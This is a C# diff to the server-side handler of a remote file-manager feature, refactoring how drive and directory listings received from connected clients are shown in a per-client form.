@@ -108,12 +108,13 @@ namespace MLManagementServer.Handlers
 
                 if (command == FileManagerCommand.DriveResponce)
                 {
-                    FormHandler[c.ID].BeginUpdate(false);
                     string[] drives = (string[])data[2];
                     string[] driveSizes = (string[])data[3];
                     string[] driveLabels = (string[])data[4];
 
-                    for(int i = 0; i < drives.Length; i++)
+                    FormHandler[c.ID].BeginUpdate(false, string.Empty);
+
+                    for (int i = 0; i < drives.Length; i++)
                     {
                         FormHandler[c.ID].AddDrive(drives[i], driveSizes[i], driveLabels[i]);
                     }
@@ -121,21 +122,27 @@ namespace MLManagementServer.Handlers
                 }
                 if (command == FileManagerCommand.DirectoryResponce)
                 {
-                    FormHandler[c.ID].BeginUpdate(true);
                     string[] folders = (string[])data[2];
-                    string[] files = (string[])data[3];
-                    string[] filesizes = (string[])data[4];
-                    foreach(string s in folders)
-                        FormHandler[c.ID].AddToList(s, "", "Folder");
+                    bool[] folderEmpty = (bool[])data[3];
+                    string[] files = (string[])data[4];
+                    string[] filesizes = (string[])data[5];
+
+                    FormHandler[c.ID].BeginUpdate(true, (string)data[6]);
+
+                    for (int i = 0; i < folders.Length; i++)
+                    {
+                        FormHandler[c.ID].AddDirectory(folders[i], folderEmpty[i]);
+                    }
+                        
                     for (int i = 0; i < files.Length; i++)
                     {
-                        FormHandler[c.ID].AddToList(files[i], filesizes[i], "File");
+                        FormHandler[c.ID].AddFile(files[i], filesizes[i]);
                     }
                         
                 }
                 if(command == FileManagerCommand.Invalid)
                 {
-                    FormHandler[c.ID].BeginUpdate(true);
+                    FormHandler[c.ID].BeginUpdate(true, (string)data[3]);
                     FormHandler[c.ID].InvalidDirectory((string)data[2]);
                 }
             }
